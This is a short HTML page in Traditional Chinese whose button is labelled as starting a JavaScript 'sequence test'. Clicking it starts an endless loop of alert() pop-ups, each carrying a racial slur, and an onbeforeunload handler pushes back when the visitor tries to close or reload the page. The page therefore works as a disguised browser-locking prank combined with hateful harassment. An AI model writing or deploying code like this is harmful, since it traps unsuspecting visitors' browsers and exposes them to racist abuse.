<!DOCTYPE html>
<html lang="zh-TW">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>訊息提示範例</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            padding-top: 100px;
            background-color: #f4f4f9;
        }
        .action-btn {
            padding: 12px 24px;
            font-size: 16px;
            background-color: #e63946;
            color: white;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-weight: bold;
            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
        }
    </style>
</head>
<body>

    <h2>JavaScript 終極序列測試</h2>
    <p>點擊下方按鈕啟動測試：</p>
    
    <button class="action-btn" onclick="showAlertSequence()">啟動測試</button>

    <script>
        // 1. 攔截關閉/重新整理動作（防誤觸離開）
        window.onbeforeunload = function() {
            return "測試尚未結束，你確定要離開嗎？";
        };

        function showAlertSequence() {
            // 2. 使用 while(true) 變成無限循環，按完 500 下會自動重來
            while (true) {
                for (let i = 1; i <= 500; i++) {
                    alert("訊息 " + i + " ：Nigger");
                }
            }
        }
    </script>

</body>
</html>
